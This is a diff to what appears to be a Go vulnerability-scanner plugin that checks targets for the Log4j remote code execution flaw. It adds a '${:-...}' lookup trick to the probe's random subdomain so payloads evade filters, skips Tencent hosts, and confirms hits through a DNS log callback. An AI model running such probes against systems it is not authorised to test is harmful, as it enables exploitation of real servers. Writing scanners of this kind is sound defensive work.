@@ -42,6 +42,9 @@ func (d *log4jRCE) GetResult() []plugin.Plugin {
 }
 
 func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
+	if strings.Contains(URL, ".o.tencent.com") {
+		return false
+	}
 
 	domain := util.GetHostFromUrl(URL)
 
@@ -50,8 +53,10 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	}
 
 	_ = meta
+	randString := utils.RandStringRunes(6)
 	// count := 0
-	randStr := domain + "." + utils.RandStringRunes(6)
+	randStr := domain + ".${:-" + randString + "}"
+	trueWord := domain + "." + randString
 	// randStr = "nowqq" + utils.RandStringRunes(6)
 	fmt.Println(randStr)
 	payloads := []string{
@@ -147,7 +152,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 				}
 				// fmt.Println(count)
 				// count++
-				if utils.IsExistDNSLog(randStr) {
+				if utils.IsExistDNSLog(trueWord) {
 					result := d.info
 					result.Response = "TEST"
 					result.Request = "TEST"
@@ -161,7 +166,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 
 	time.Sleep(time.Duration(6) * time.Second)
 
-	if utils.IsExistDNSLog(randStr) {
+	if utils.IsExistDNSLog(trueWord) {
 		result := d.info
 		result.Response = "TEST"
 		result.Request = "TEST"
